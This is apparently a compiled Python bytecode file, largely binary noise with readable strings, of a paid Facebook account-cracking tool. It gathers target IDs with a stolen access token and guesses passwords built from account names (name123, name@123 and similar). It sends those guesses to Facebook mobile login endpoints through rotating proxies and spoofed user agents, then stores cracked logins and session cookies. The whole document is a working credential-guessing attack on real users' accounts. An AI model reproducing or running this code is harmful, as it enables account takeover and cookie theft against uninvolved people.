�
    4He�G  �                   ��
  � d dl Z d dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dl
mZ d d	l m!Z" d d
l#m$Z% d dl
mZ& d dl
m'Z' d dl(m)Z*  e'j+        �   �           e�   �         Z,dgZ-dgZ-dgZ-dgZ-dgZ-g Z.g Z/g Z0 ej1        �   �         Z2g Z3	  ej4        d�  �        j5        Z6 e7dd�  �        �8                    e6�  �         n# e9$ rZ: ed�  �         Y dZ:[:ndZ:[:ww xY w e7dd�  �        �;                    �   �         �<                    �   �         Z6 e=d�  �        D �]oZ>dZ? ej@        dd�  �        ZA ej@        dd�  �        ZBdZC ej@        dd�  �        Z:dZD ej@        dd�  �        ZE ej@        dd�  �        ZF ej@        dd�  �        ZG ej@        dd�  �        ZHd ZIe?� eA� d!eB� d"eC� e:� eD� eE� d!eF� d!eG� d!eH� d"eI� �ZJe.�K                    eJ�  �         d#ZL ejM        g d$��  �        ZAd%ZB ejM        g d&��  �        ZC ej@        dd'�  �        Z: ejM        g d&��  �        ZDd(ZE ej@        d)d�  �        ZFd*ZG ej@        d+d,�  �        ZH ej@        d-d.�  �        ZId/ZNeL� d"eA� d0eB� eC� e:� eD� d1eE� eF� d!eG� d!eH� d!eI� d"eN� �ZOe/�K                    eO�  �         ��q e=d2�  �        D ]�ZPd3Z? ej@        dd�  �        ZA ej@        dd�  �        ZB ejM        g d&��  �        ZC ejM        g d&��  �        Z: ejM        g d&��  �        ZD ejM        g d&��  �        ZE ej@        dd�  �        ZFd4ZG ej@        dd�  �        ZH ej@        dd�  �        ZId5ZNe?� eA� d6eB� eC� e:� eD� eE� eF� eG� eH� d!eI� d"eN� �ZQ��d7� ZJg g d d d g g g g g g g g f\  ZRZSaTaUaVZWZXZYZZZ[Z\Z]Z^g Z0d8� Z_d9Z`d:Zad;Zbd<Zcd=Zdd>Zed?Zfd@ZgdAZhdBZidCZjdDZkdEZldFZPd=ZmdGZId>ZFdHZndIZodJZpdBZAdKZq ejM        emeIeFeoeAg�  �        Zrg g cZsZtdLdMdNdOdPdQdRdSdTdUdVdWdX�ZudLdMdNdOdPdQdRdSdTdUdVdYdZ�Zvej        �w                    �   �         jx        Zyeu ezej        �w                    �   �         j{        �  �                 Z|ej        �w                    �   �         j}        Z~d[ ezey�  �        z   d\z    eze|�  �        z   d\z    eze~�  �        z   d]z   Zd^ ezey�  �        z   d\z    eze|�  �        z   d\z    eze~�  �        z   d]z   Z�d_� Z�d`� Z�da� Z�db� Z_d Z� e j�        dc�  �          e j�        dd�  �         de� Z�df� Z�dg� Z�dh� Z�di� Z�dj� Z�dk� Z�dl� Z�dm� Z�e�dnk    r0 e j�        do�  �         n#  Y nxY w e j�        dp�  �         n#  Y nxY wdq� Z� e��   �          dS )r�    N)�Table)�Console)�BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columns)�pretty)�Textz�Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5792.217 Mobile Safari/537.36z�Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/630.12.5 (KHTML, like Gecko) Version/11.5.82 Mobile/K8GUA6 Safari/630.12.5z|Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36zwMozilla/5.0 (Linux; Android 10; Tab8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5782.224 Mobile Safari/537.36z�Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/614.7 (KHTML, like Gecko) Version/14.5 Mobile/ZM4XS2 Safari/614.7z5https://github.com/Pro-Max-420/Api/blob/main/prox.txtz	.prox.txt�w� �ri'  z!Mozilla/5.0 (Symbian/3; Series60/�   �	   �Nokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� z6Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X))�6�7�8�9�10�11�12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z0AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile/15E148 Safari/605.1z; z) �
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzD; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/z�Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]�/c                  ��  � 	 t          dd�  �        �                    �   �         �                    �   �         } | D ]}t          �                    |�  �         �d S #  t          j        d�  �        j        }t          dd�  �        } t          j	        dt          |�  �        �  �        }|D ]}| �                    |dz   �  �         �t          dd�  �        �                    �   �         �                    �   �         } Y d S xY w)Nz	bbnew.txtr   z5https://github.com/Pro-Max-420/ua/blob/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<�
)�open�read�
splitlines�ugen�append�requests�get�text�re�findall�str�write)�ua�ub�a�aa�uns        �temp.py�uakurS   W   s�   � �
0�	�+�c�����!�!�,�,�.�.�"�� � �b��;�;�r�?�?�?�?�� ��0��L�H�I�I�N�!�	�,�s���"��Z��s�1�v�v�&�&�"�� � �b��8�8�B�t�G�����	�,�s��� � �"�"�-�-�/�/�"�"�"�"���s   �AA �BC8c                  �"   � t          �   �          d S )N)�login� �    rR   �backrX   f   s   � ������rW   �Huri�SETUzCLASS3-z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34m�January�February�March�April�May�June�July�August�	September�October�November�December)�1�2�3�4�5r   r   r   r   r   r   r   �Devember)�01�02�03�04�05�06�07�08�09r   r   r   zOK-�-z.txtzCP-c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )Nr@   g{�G�zt?��sys�stdoutrL   �flush�time�sleep��u�es     rR   �	alvino_xyr�   �   sQ   � ��T��R�R�A�#�*�*�*�1�-�-�-�c�j�.>�.>�.@�.@�.@���E�AR�AR�AR�AR�R�RrW   c                 �   � | dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )Nr@   �{�G�z�?rx   r~   s     rR   �Hurijr�   �   sQ   � ��T��Q�Q�A�#�*�*�*�1�-�-�-�c�j�.>�.>�.@�.@�.@���D�AQ�AQ�AQ�AQ�Q�QrW   c                  �.   � t          j        d�  �         d S )N�clear)�os�systemrV   rW   rR   r�   r�   �   s   � ���7�����rW   c                  �*   � t          �   �          dd l} d S )Nr   )rU   �getpass)r�   s    rR   rX   rX   �   s   � ����������rW   r�   z@xdg-open https://www.facebook.com/profile.php?id=100080266987497c                  �L   � t          j        d�  �         t          d�  �         d S )Nr�   aA  
[1;92m
##     ## ##     ## ########  #### 
##     ## ##     ## ##     ##  ##  
##     ## ##     ## ##     ##  ##  
######### ##     ## ########   ##  
##     ## ##     ## ##   ##    ##  
##     ## ##     ## ##    ##   ##  
##     ##  #######  ##     ## #### 
[+] OWNER : HURI 
[+] VERSION : 0.1
[+] TOOLS : FREE FOR TRY)r�   r�   r	   rV   rW   rR   �bannerr�   �   s3   � ���7����� 	� � � � � rW   c                  �   � t          �   �          t          d�  �         t          d�  �         t          d�  �        } t          j        d�  �         | dv rt          �   �          d S | dv rt          �   �          d S | dv rt          �   �          d S | dv rt          j	        d	�  �         d S | d
v rGt          j	        d�  �         t          j	        d�  �         t          d�  �         t          �   �          d S t          d�  �         t          �   �          d S )Nz1[1] File Cloning
[2] Contact With Admin
[0] EXIT �/===============================================z[1;92m[+] CHOOSE: r�   )�m)rg   )�i�0i�rh   rn   z$xdg-open https://wa.me/+881888752730)r:   zrm -rf .token.txtzrm -rf .cookie.txtz#DONE LOGOUT z# SELECT CORRECTLY )r�   r�   �inputr|   r}   �public�
crack_file�resultr�   r�   r	   �exitrX   )rY   s    rR   rU   rU   �   s  � ������<�=�=�=��8�9�9�9��%�&�&��t�z�$�'7�'7�'7��E�M�M��(�(�(�(�(�
�e�m�m��,�,�,�,�,�
�j����(�(�(�(�(�
�j����)�2�3�3�3�3�3�
�e�m�m��)�� � � ��)� �!�!�!�������&�&�&�&�&�������&�&�&�&�&rW   c                  �   � t          t          � dt          � ��  �         t          j        d�  �         t          �   �          d S )N�#TRY AGAIN r   )r	   �kr   r|   r}   rX   rV   rW   rR   �errorr�   �   s8   � ��!�����������A���������rW   c            	      �  � t          j        d�  �         t          �   �          t          d�  �         t          d�  �         t          d�  �         t	          d�  �        } | dv �rWt          j        d�  �        }nA# t          $ r4 t          d�  �         t          j        d	�  �         t          �   �          Y nw xY wt          |�  �        d
k    r3t          d�  �         t          j        d�  �         t          �   �          d S d
}i }|D �]g}t          d|z   d�  �        �                    �   �         }n#  Y �-xY w|dz  }|dk     r�dt          |�  �        z   }|�                    t          |�  �        t          |�  �        i�  �         |�                    |t          |�  �        i�  �         t          d|z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��|�                    t          |�  �        t          |�  �        i�  �         t          dt          |�  �        z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��it	          d�  �        }||         }n-# t           $ r  t          d�  �         t#          �   �          Y nw xY wt          d|z   d�  �        �                    �   �         �                    �   �         }	n8#  t          d�  �         t          j        d�  �         t          �   �          Y nxY wd
}
t)          t          |	�  �        �  �        D ]Y}|	|
         �                    d�  �        }d|d
         � d|d         � �}t-          �   �         �                    |d��  �         |
dz  }
�Zt	          d�  �         t          �   �          d S | dv �rWt          j        d�  �        }nA# t          $ r4 t          d �  �         t          j        d�  �         t          �   �          Y nw xY wt          |�  �        d
k    r3t          d!�  �         t          j        d�  �         t          �   �          d S d
}i }|D �]g}t          d"|z   d�  �        �                    �   �         }n#  Y �-xY w|dz  }|d#k     r�d$t          |�  �        z   }|�                    t          |�  �        t          |�  �        i�  �         |�                    |t          |�  �        i�  �         t          d|z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��|�                    t          |�  �        t          |�  �        i�  �         t          dt          |�  �        z   dz   |z   dz   t          t          |�  �        �  �        z   dz   t          z   �  �         ��it	          d%�  �        }||         }n-# t           $ r  t          d&�  �         t#          �   �          Y nw xY wt          d"|z   d�  �        �                    �   �         �                    �   �         }	n8#  t          d �  �         t          j        d�  �         t          �   �          Y nxY wd
}
t)          t          |	�  �        �  �        D ]Y}|	|
         �                    d�  �        }d'|d
         � d|d         � �}t-          �   �         �                    |d(��  �         |
dz  }
�Zt	          d)�  �         t          �   �          d S | d*v rt          �   �          d S t          d+�  �         t#          �   �          d S ),Nr�   z 1. CP ACCOUNT z 2. OK ACCOUNTz	 0. EXIT	z
 Choose : �rg   rm   �CPz File Not Found�   r   zYou Have No CP Results �   zCP/r   r   r=   r:   �[�] z [ z
 Account ]z
   Choose : z CHOOSE RIGHT OPTION zFILE NOT FOUND �|z  �yellow)�stylez[ Click Enter ]r�   �OKzFile Not Found z No OK FILE HERE �OK/r   r   z
 CHOOSE : z SELECT RIGHT OPTION r   �greenz[ CLICK ENTER 2 BACK ])r:   �00zSELECT RIGHT OPTION )r�   r�   r�   r	   r�   �listdir�FileNotFoundErrorr|   r}   rX   �lenrA   �	readlinesrK   �updater   �KeyErrorr�   rB   rC   �range�split�sol)�kz�vin�cih�lol�isi�hem�nom�geeh�geh�lin�nocp�cpku�cpkuni�cpkuhs                 rR   r�   r�   �   s�  � ���7�������������������{�����N�����*����J�t���c�c��	� 
� 
� 
��	�����:�a�=�=�=��6�6�6�6�6�
���� 	��X�X�q�[�[��	"�#�#�#��:�a�=�=�=��6�6�6�6�6�	
�3�	�3�� E� E�s��5��9�S�!�!�+�+�-�-�����8�8������F�C�
�2�v�v��s�3�x�x�<�S��Z�Z��S���#�c�(�(�#�$�$�$��Z�Z��S��X�X�����
�3�s�7�4�<���E�!�#�c�#�h�h�-�-�/��<�Q�>�?�?�?�?��Z�Z��S���#�c�(�(�#�$�$�$�
�3�s�3�x�x�<���S� ��&�s�3�s�8�8�}�}�4�\�A�!�C�D�D�D�D�
� �
!�
!�4���Y�s�s��
� � � �	�
!�"�"�"��F�F�F�F�F����� �%��)�C� � �%�%�'�'�2�2�4�4�s�s���	�
�����J�q�M�M�M��F�F�F�F�F����	�4��S��X�X��� � �t��t�9�?�?�3���F�
'�v�a�y�
'�
'�F�1�I�
'�
'�E��E�E�K�K��H�K�%�%�%��1�H�D�D��	�����6�6�6�6�6��J����J�t���c�c��	� 
� 
� 
��	�����:�a�=�=�=��6�6�6�6�6�
���� 	��X�X�q�[�[��	�����:�a�=�=�=��6�6�6�6�6�	
�3�	�3�� E� E�s��5��9�S�!�!�+�+�-�-�����8�8������F�C�
�3�w�w��c�#�h�h�;�S��Z�Z��S���#�c�(�(�#�$�$�$��Z�Z��S��X�X�����
�3�s�7�4�<���E�!�#�c�#�h�h�-�-�/��<�Q�>�?�?�?�?��Z�Z��S���#�c�(�(�#�$�$�$�
�3�s�3�x�x�<���S� ��&�s�3�s�8�8�}�}�4�\�A�!�C�D�D�D�D�
��
�
�4���Y�s�s��
� � � �	�
!�"�"�"��F�F�F�F�F����� �%��)�C� � �%�%�'�'�2�2�4�4�s�s���	�
�����J�q�M�M�M��F�F�F�F�F����	�4��S��X�X��� � �t��t�9�?�?�3���F�
&�f�Q�i�
&�
&�6�!�9�
&�
&�E��E�E�K�K��G�K�$�$�$��1�H�D�D��	!�"�"�"��6�6�6�6�6��J����&�&�&�&�&�������&�&�&�&�&sx   �$A9 �9;B7�6B7�	%D/�/D3�>J �'J1�0J1�47K, �,3L!� O �;P�P�%%R�R�W# �#'X�X�7Y �3Y=c                  �  � 	 t          dd�  �        �                    �   �         } t          dd�  �        �                    �   �         }n# t          $ r t          �   �          Y nw xY w	 t	          j        d�  �         t          �   �          t          t          d�  �        �  �        }n# t          $ r t          �   �          Y nw xY w|dk     s|dk    rt          �   �          t          j        �   �         }d}t          |�  �        D ]C}|dz  }t          d	t          |�  �        z   d
z   �  �        }t          �                    |�  �         �Dt          D ]�}	 |�                    d|z   dz   t$          d         z   d|i��  �        �                    �   �         }|d         d         D ]B}		 |	d         dz   |	d         z   }
|
t(          v rnt(          �                    |
�  �         �<#  Y �@xY w��# t*          t          f$ r Y ��t          j        j        $ r& t1          d�  �         t	          j        d�  �         Y ��w xY w	 t1          dt2          � �t          t5          t(          �  �        �  �        z   �  �         t1          d�  �         t7          �   �          d S # t          j        j        $ r' t1          t8          � �  �         t          �   �          Y d S t*          t          f$ r5 t1          d�  �         t;          j        d�  �         t          �   �          Y d S w xY w)Nz
.token.txtr   z.cok.txtr�   z[+] ENTER THE NUMBERS OF IDZ: r   i ��r   z [] INPUT ID z: z https://graph.facebook.com/v2.0/z)?fields=friends.limit(5000)&access_token=�cookies)r�   �friends�data�idr�   �namer�   z [] TOTAL ID: r   zKIF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWISE CHECK YOUR ID LINK r�   )rA   rB   �IOErrorr�   r�   r�   r�   �intr�   �
ValueErrorrX   rF   �Sessionr�   rK   �uidrE   rG   �tokenku�jsonr�   r�   �
exceptions�ConnectionErrorr	   r.   r�   �settingr   r|   r}   )�token�cok�jum�ses�yz�met�kl�userr�col�mi�isos              rR   r�   r�   5  s8  � �	�
�|�C�
 �
 �
%�
%�
'�
'�%��Z����!�!�#�#�#�#��� 	� 	� 	��&�&�&�&�&�	����	��)�G�����(�(�(��E�2�3�3�4�4�#�#��� 	� 	� 	��&�&�&�&�&�	���� ��E�E�S��]�]��&�&�&���������#�J�J� � �S��a�%�"���c�"�g�g�%�d�*�+�+�"��*�*�R�.�.�.�.�� � �U��	���3�E�9�:e�e�fm�no�fp�p�  ~G�  HK�  }L��  
M�  
M�  
R�  
R�  
T�  
T�3���^�F�#� � �r���t�H�S�L��F��#�S��r�	�	�$�
�)�)�C�.�.�.����8�8������ �7�	� � � ��4�	�	�	,� � � �������9�W����������
	���!���c�#�b�'�'�l�l�*�+�+�+���)�)�)�	�)�)�)�)�)����+� 	� 	� 	��1��-�-�-��&�&�&�&�&�&�	�'�� 	� 	� 	��V�W�W�W��*�Q�-�-�-��&�&�&�&�&�&�	���so   �AA �A"�!A"�&>B% �%C �?C �AG �8G�G �G�G � H,�36H,�+H,�0AJ �7L�AL�Lc                  ��  � t          j        d�  �         t          �   �          t          d�  �         t	          d�  �        } t          d�  �         t          | �  �        �                    �   �         �                    �   �         }n8#  t          d�  �         t          j	        d�  �         t          �   �          Y nxY w|D ]}t          �                    |�  �         �t          �   �          d S )Nr�   z9[1;32m[ Put File Example:  /sdcard/HURI.txt (FILE NAME)]z[+] INPut FILE NAME : r   zFile Not Foundr�   )r�   r�   r�   r	   r�   rA   rB   rC   r|   r}   rX   r�   rE   r�   )�or�   �xids      rR   r�   r�   e  s�   � ���7���������E�F�F�F�
�#�$�$���r������7�7�<�<�>�>�$�$�&�&�S�S��	�������*�Q�-�-�-��&�&�&�&�&����� � �S��)�)�C�.�.�.�.������s   �3B �3B9c                  ��  � d} | dv r3t          t          �  �        D ]}t          �                    |�  �         ��n| dv rzg }t          t          �  �        D ]}|�                    |�  �         �t	          |�  �        }|dz
  }t          |�  �        D ]'}t          �                    ||         �  �         |dz  }�(n�| dv rMt          D ]D}t          j        dt	          t          �  �        �  �        }t          �                    ||�  �         �EnLt          D ]D}t          j        dt	          t          �  �        �  �        }t          �                    ||�  �         �Et          d�  �         t          d�  �        }|dv rt          �                    d	�  �         n9|dv rt          �                    d
�  �         nt          �                    d	�  �         t          �   �          t          �   �          d S )Nri   r�   r�   r   )ri   ro   r   z*[1] METHOD 1 (BEST)
[2] METHOD 2 (WORKING)z	 CHOOSE: �mobile�mbasic)�sortedr�   �id2rE   r�   r�   �random�randint�insertr	   r�   �method�passwrdr�   )	�hu�tua�muda�bacot�bcm�bcmi�xmud�xx�hcs	            rR   r�   r�   u  s�  � �	���*����B�Z�Z� � �c��:�:�c�?�?�?�?���J���	�$��b�z�z� � �e��;�;�u�����	�$�i�i�#��A��$��C�j�j� � �d��:�:�d�4�j�����!�8�4�4�� 	�J���� � �e���q��S���"�"�2��:�:�b������� � � �e���q��S���"�"�2��:�:�b�������4�5�5�5��K�����*����-�-�������J����-�-�������-�-��������������rW   c                  �4  � t          j        d�  �         t          �   �          t          dt	          t          t          �  �        �  �        z   �  �         t          d�  �         t          d�  �         t          d�  �         t          d��  �        5 } t          D �]}|�
                    d�  �        d	         |�
                    d�  �        d
         �                    �   �         }}|�
                    d�  �        d	         }g }t          |�  �        dk     �r3t          |�  �        dk     r��|�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         ���t          |�  �        dk     r|�                    |�  �         �n|�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |�  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         |�                    |dz   �  �         | �                    t          ||�  �         ��	 d d d �  �         n# 1 swxY w Y   t          d�  �         t          d�  �         t          d�  �         t          dt          z  �  �         t!          d�  �         d S )Nr�   z[+] TOTAL IDz : z[+] Cloning Speed Super Fastz)[+]TURN ON/OFF FLIGHT MODE IN EVERY 5 MINr�   �   )�max_workersr�   r   r   r   �   r�   �123�1234�12345�@z@123z@@z@@@z@@@@z@#�1122r   r   z*==========================================zCLONING COMPLETE .......... zYour Total OK idz : %s zCLICK ENTER TO EXIT )r�   r�   r�   r	   rK   r�   r�   r�   �tredr�   r�   �lowerrE   �submit�crack�okr�   )�pool�yuzong�idf�nmf�frs�pwvs         rR   r�   r�   �  s�  � ���7����������#�c�"�g�g�,�,�&�'�'�'��%�&�&�&��2�3�3�3��9�:�:�:�
�r���� *�d�� )� )�f��\�\�#���q�!�&�,�,�s�"3�"3�A�"6�"<�"<�">�">�s�3�	���3����	�3�	�3�	�#�h�h�q�j�j�
�3�x�x��z�z�	��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��_�_�_��Z�Z��C������Z�Z��F�
�����Z�Z��D������Z�Z��E�	�����Z�Z��F�
�����Z�Z��D������Z�Z��F�
�����Z�Z��D������ �3�x�x��z�z��Z�Z��_�_�_�_��Z�Z��E�	�����Z�Z��F�
�����Z�Z��G������Z�Z��_�_�_��Z�Z��C������Z�Z��F�
�����Z�Z��D������Z�Z��E�	�����Z�Z��F�
�����Z�Z��D������Z�Z��F�
�����Z�Z��D����� 	�K�K��c�#�����S)�*� *� *� *� *� *� *� *� *� *� *���� *� *� *� *�V �r�����3�4�4�4��%�&�&�&��!�2�&�'�'�'�������s   �LN:�:N>�N>c                 �*	  � t          j        t          t          t          t
          t          t          g�  �        }t          j	        �
                    d|� dt          � dt          � t          � t          � dt          � t          t          �  �        � t          � d|� dt          � dt          � dt          � d|� t          � t          � d	��  �        f t          j	        �                    �   �          t          j        t"          �  �        }t          j        t$          �  �        }t'          j        �   �         }|D �]X}	 t          j        t*          �  �        }d
d|z   i}|j        �                    dd|ddddddddddd��  �         |�                    d| z   dz   �  �        }	t3          j        dt7          |	j        �  �        �  �        �                    d�  �        t3          j        dt7          |	j        �  �        �  �        �                    d�  �        | dd|d�}
d �                    d!� |	j        �                     �   �         �!                    �   �         D �   �         �  �        }|d"z  }dd#dd$d%|ddddddd&ddd'�}|�"                    d(|
d)|i|d*|�+�  �        }d,|j        �                     �   �         �#                    �   �         v rktI          d-tK          j&        d.�  �        � d/| � d0|� ��  �         tO          j(        d1�  �         tR          �*                    | d2z   |z   �  �         tV          dz  a+ �nfd3|j        �                     �   �         �#                    �   �         v �rt          dz  a|j        �                     �   �         }d �                    d4� |j        �                     �   �         �!                    �   �         D �   �         �  �        }tI          d-tK          j&        d.�  �        � d5| � d0|� d6|� d7�	�  �         tI          d8�  �         tO          j(        d9�  �         tY          d:tZ          z   d;�  �        �
                    | d0z   |z   d<z   �  �         t]          t^          |�  �          n1��+# t&          j0        j1        $ r tK          j2        d=�  �         Y ��Vw xY wt          dz  ad S )>N�u   [Huri-😈]☺️r�   u   ]🥒[�]u   🥺�Oku   •r�   �httpz	socks4://zm.facebook.comrg   z�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-origin�cors�empty�documentzhttps://m.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)�Host�upgrade-insecure-requests�
user-agent�accept�dnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagez8https://p.facebook.com/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdrzname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"z)https://p.facebook.com/login/save-device/�login_no_pin)�lsd�jazoestr�   �next�flow�pass�;c                 �"   � g | ]\  }}|�d |����S ��=rV   ��.0�key�values      rR   �
<listcomp>zcrack.<locals>.<listcomp>�  s'   � �^�^�^�*�#�u�#�#�#�u�u�-�^�^�^rW   z  m_pixel_ratio=2.625; wd=412x756z	max-age=0zhttps://m.facebook.comz!application/x-www-form-urlencodedzlhttps://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)r  zcache-controlr  �originzcontent-typer  r  r  r  r  r  r  r  r  r  zChttps://p.facebook.com/login/device-based/validate-password/?shbl=0�cookieF)r�   r�   �headers�allow_redirects�proxies�
checkpointz[z%H:%Mu   •Huri-Cp] u    • zespeak -a 300 " C,  P"r�   �c_userc                 �"   � g | ]\  }}|�d |����S r#  rV   r%  s      rR   r)  zcrack.<locals>.<listcomp>�  s'   � �a�a�a�:�3��3�3�3���.�a�a�arW   u   •Huri-Ok🖕] u   
[☺️]= COOKIES • r   zE[0;94m==============================================================zespeak -a 300 " Huri,  Ok,  id"r�   rO   r@   �   )3r�   �choicer�   r�   �h�br   �xry   rz   rL   r.   �loopr�   r�   r�   r{   rD   �ugen2rF   r�   �proxr,  r�   rG   rI   �searchrK   rH   �group�joinr�   �get_dict�items�post�keysr	   r|   �strftimer�   r�   �akunrE   �cprA   �okc�cek_apk�sessionr�   r�   r}   )r  r  �borM   �ua2r�   �pw�nip�proxs�p�dataa�koki�heade�po�coki�kukis                   rR   r�   r�   �  s4  � ��m�Q�q��1�Q�q�M�"�"������v�r�v�v�A�v�v��v�4�v��v�v�!�v�S��W�W�v�a�v�v�RT�v�v�Z[�v�v�^_�v�v�cd�v�v�ik�v�mo�v�qr�v�v�v�w�w�x�x���������m�D�����}�U���������� "� "�R�!��}�T���3��;�s�?�
#�5��;���.�3�\_�  jJ�  QT�  hu�  GT�  fl�  ~E�  Wa�  lE�  Xj�  }Y	�  Z	�  Z	�  [	�  [	�  [	�
�w�w�I�#�M�Ny�y�z�z�1���5�s�1�6�{�{�C�C�I�I�!�L�L�WY�W`�a�  BE�  FG�  FL�  BM�  BM�  XN�  XN�  XT�  XT�  UV�  XW�  XW�  ^a�  iT�  \j�  rt�  v�  v�5��*�*�^�^��	�@R�@R�@T�@T�@Z�@Z�@\�@\�^�^�^�
_�
_�4��	+�+�4�!�+�Z]�g�  Ps�  AC�  Mm�  AN�  `m�  E�  W^�  pz�  E	s
�  FX�  kG�  
H�  
H�5����V�\a�ks�uy�jz�  DI�  Z_�  hm��  	n�  	n�2��b�j�)�)�+�+�0�0�2�2�2�2�	�
B���g�&�&�
B�
B�C�
B�
B�b�
B�
B�C�C�C��I�&�'�'�'��K�K��C���
������E�B�	�E��C�K�(�(�*�*�/�/�1�1�1�1���E�B�	��	�	�	�	�D��:�:�a�a���AU�AU�AW�AW�A]�A]�A_�A_�a�a�a�b�b�D�	�
e���g�&�&�
e�
e��
e�
e�"�
e�
e�^b�
e�
e�
e�f�f�f�	�
T�U�U�U��I�/�0�0�0���s��3�����c�'�k�"�n�T�1�2�2�2��G�D����	�E� ��	�	�	,� � � ��:�b�>�>�>�>�>������q����s   �3G-Q�#D3Q�(R�R�__main__zgit pullztouch prox.txtc                  �  � t          dd�  �        �                    �   �         } t          j        d�  �        j        }| |v r$t          j        d�  �         t          �   �          d S t          j        d�  �         t          d�  �         t          j
        d�  �         t          d�  �         t          d�  �         t          d	�  �         t          d
t          z   t          z   | z   �  �         t          d�  �        }t          d�  �         t          j
        d�  �         d|z   dz   t          z   t          z   dz   | z   }t          j        d|z   �  �         d S )Nz /storage/emulated/0/android8.txtr   zFhttps://github.com/Huri-King/Public-CloNing-42o/blob/main/Approval.txtr�   u:   [97;1m[[92;1m•[97;1m][0;92m FREE USER NOT COME INBOXg����MbP?uC   [97;1m[[92;1m•[97;1m][38;5;208m Huri King, ToOLs Daily Updateu/   [97;1m[[92;1m•[97;1m][0;92m 7 DAYS 300 Tku0   [97;1m[[92;1m•[97;1m][0;92m 15 DAYS 500 Tku5   [97;1m[[92;1m•[97;1m][0;92m Your Key  :[0;93m u.   [97;1m[[92;1m•[97;1m][0;92m Your Name : u9   [97;1m[[92;1m•[97;1m][0;92m Press Enter To Send Keyg      @u�   Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20z�%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20r   z+am start https://wa.me/+8801608843956?text=)rA   rB   rF   rG   rH   r�   r�   rU   r	   r|   r}   �akrY   r�   )�key1�r1r�   �tkss       rR   �SubscraptionrY    so  � �
�-�s�3�3�8�8�:�:���L�Y�Z�Z�_���B�J�J��)�G�����'�'�'�'�'��)�G�����O�P�P�P��*�V�����Y�Z�Z�Z��D�E�E�E��E�F�F�F��M�b�P�QU�U�VZ�Z�[�[�[�	�J�	K�	K�$��N�O�O�O��*�S�/�/�/� 	l�  mq�  	q�  rM�  	M�  NP�  	P�  QU�  	U�  VX�  	X�  Y]�  	]�#��)�9�C�?�@�@�@�@�@rW   )�r�   rF   �bs4r�   ry   r�   �datetimer|   rI   �urllib3�rich�base64�zlib�platform�
rich.tabler   �me�rich.consoler   r�   r   �sop�concurrent.futuresr   r�   r   �gp�
rich.panelr   �nelr	   �cetak�rich.markdownr
